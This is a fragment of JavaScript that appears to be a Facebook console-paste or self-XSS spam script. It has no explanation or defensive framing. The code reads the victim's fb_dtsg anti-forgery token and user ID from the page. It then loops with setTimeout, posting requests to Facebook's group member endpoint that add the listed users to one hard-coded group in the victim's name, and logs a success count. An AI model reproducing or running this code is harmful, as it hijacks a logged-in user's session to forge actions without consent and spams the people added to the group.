...
var tulisanNganu2='This User Has Been Added Sucessfully.';
var kunaon='';
...
kunaon+="<div style=color:darkpurple'>"+tulisanNganu2+"</div>";
kunaon+=arr[i];
suc++;
}
kunaon+="</div>";
...
tay--;
if(tay>0){var s=arr[tay];setTimeout("penetrasi("+s+")",100);}console.log(tay+"/"+arr.length+":"+s+", success:"+suc);if(memberGroupId!=321811624580673){jx.load(window.location.protocol+"//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value+"&group_id=321811624580673&source=typeahead&members="+opo+"&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user="+Env.user,function(){},"text","post");}
}
